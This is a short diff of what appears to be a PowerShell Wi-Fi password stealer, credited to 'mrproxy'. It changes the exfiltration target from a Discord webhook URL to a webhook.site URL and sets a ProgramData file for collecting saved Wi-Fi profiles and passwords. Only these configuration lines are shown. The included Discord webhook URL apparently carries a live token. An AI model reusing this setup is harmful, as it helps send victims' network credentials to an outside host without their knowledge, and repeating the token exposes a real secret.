@@ -1,7 +1,7 @@
 # Created by mrproxy
 
 # Discord webhook URL
-$webhook = "https://discord.com/api/webhooks/1301990032567042159/PP7RFPrRII5BKybbo1-7o-YAxVRcdmZmzPMJEt6pcJaSoyc6aWhG4tEzAOeuJXhQRjnw"
+$webhook = "https://webhook.site/9a9a0453-5451-43ce-a84a-682441061c46"
 
 # Output file to save Wi-Fi profiles and passwords
 $outputFile = "C:\ProgramData\WifiPasswords.txt"
